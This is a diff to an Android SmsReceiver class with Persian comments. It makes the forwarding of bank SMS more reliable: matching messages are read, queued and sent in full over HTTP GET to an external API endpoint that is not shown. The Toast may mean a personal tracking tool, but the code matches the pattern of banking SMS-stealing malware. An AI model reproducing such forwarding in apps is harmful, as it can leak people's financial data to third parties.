@@ -29,7 +29,10 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
+        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
+            retryPendingSms(context);
+            return;
+        }
 
         Bundle bundle = intent.getExtras();
         if (bundle == null) return;
@@ -51,12 +54,12 @@ public class SmsReceiver extends BroadcastReceiver {
         Toast.makeText(context, "پیامک بانکی دریافت شد", Toast.LENGTH_LONG).show();
 
         final PendingResult pendingResult = goAsync();
+
         new Thread(() -> {
             try {
-                boolean sent = sendNow(msg);
-                if (!sent) {
-                    savePendingSms(context, msg);
-                }
+                // همه پیامک‌ها اول داخل صف ذخیره می‌شوند
+                // بعد صف به ترتیب ارسال می‌شود
+                savePendingSms(context, msg);
                 retryPendingSms(context);
             } finally {
                 pendingResult.finish();
@@ -66,35 +69,49 @@ public class SmsReceiver extends BroadcastReceiver {
 
     private boolean isBankSms(String msg) {
         if (msg == null) return false;
+
         return msg.contains("حساب") &&
-                (msg.contains("29002") || msg.contains("33002") || msg.contains("41002") ||
-                 msg.contains("84009") || msg.contains("73004") ||
-                 msg.contains("38006") || msg.contains("04004"));
+                (msg.contains("29002") ||
+                 msg.contains("33002") ||
+                 msg.contains("41002") ||
+                 msg.contains("84009") ||
+                 msg.contains("73004") ||
+                 msg.contains("38006") ||
+                 msg.contains("04004"));
     }
 
     private static boolean sendNow(String msg) {
         HttpURLConnection conn = null;
         BufferedReader br = null;
+
         try {
             String encoded = URLEncoder.encode(msg, "UTF-8");
             URL url = new URL(API_BASE + encoded);
+
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(15000);
 
             int code = conn.getResponseCode();
-            if (code < 200 || code >= 400) return false;
+
+            if (code < 200 || code >= 400) {
+                return false;
+            }
 
             br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             while (br.readLine() != null) {}
+
             return true;
+
         } catch (Exception e) {
             return false;
+
         } finally {
             try {
                 if (br != null) br.close();
             } catch (Exception ignored) {}
+
             if (conn != null) conn.disconnect();
         }
     }
@@ -102,8 +119,8 @@ public class SmsReceiver extends BroadcastReceiver {
     private static synchronized void savePendingSms(Context context, String msg) {
         List<String> queue = getQueue(context);
 
-        // جلوگیری از ذخیره تکراری همان پیام در صف گوشی
-        if (!queue.contains(msg)) {
+        // پیام‌های مشابه هم باید ثبت شوند، چون ممکن است مبلغ‌ها یا زمان‌ها نزدیک باشند
+        if (msg != null && msg.trim().length() > 0) {
             queue.add(msg);
             saveQueue(context, queue);
         }
@@ -111,23 +128,28 @@ public class SmsReceiver extends BroadcastReceiver {
 
     public static void retryPendingSms(Context context) {
         if (syncRunning) return;
+
         syncRunning = true;
 
         new Thread(() -> {
             try {
                 List<String> queue = getQueue(context);
+
                 if (queue.isEmpty()) return;
 
                 List<String> failed = new ArrayList<>();
 
+                // ارسال به ترتیب دریافت پیامک‌ها
                 for (String msg : queue) {
                     boolean sent = sendNow(msg);
+
                     if (!sent) {
                         failed.add(msg);
                     }
                 }
 
                 saveQueue(context, failed);
+
             } finally {
                 syncRunning = false;
             }
@@ -136,27 +158,38 @@ public class SmsReceiver extends BroadcastReceiver {
 
     private static List<String> getQueue(Context context) {
         List<String> list = new ArrayList<>();
+
         try {
             SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
             String json = prefs.getString(KEY_QUEUE, "[]");
+
             JSONArray arr = new JSONArray(json);
+
             for (int i = 0; i < arr.length(); i++) {
-                list.add(arr.optString(i, ""));
+                String item = arr.optString(i, "");
+                if (item != null && item.trim().length() > 0) {
+                    list.add(item);
+                }
             }
+
         } catch (Exception ignored) {}
+
         return list;
     }
 
     private static void saveQueue(Context context, List<String> queue) {
         try {
             JSONArray arr = new JSONArray();
+
             for (String msg : queue) {
                 if (msg != null && msg.trim().length() > 0) {
                     arr.put(msg);
                 }
             }
+
             SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
             prefs.edit().putString(KEY_QUEUE, arr.toString()).apply();
+
         } catch (Exception ignored) {}
     }
 }
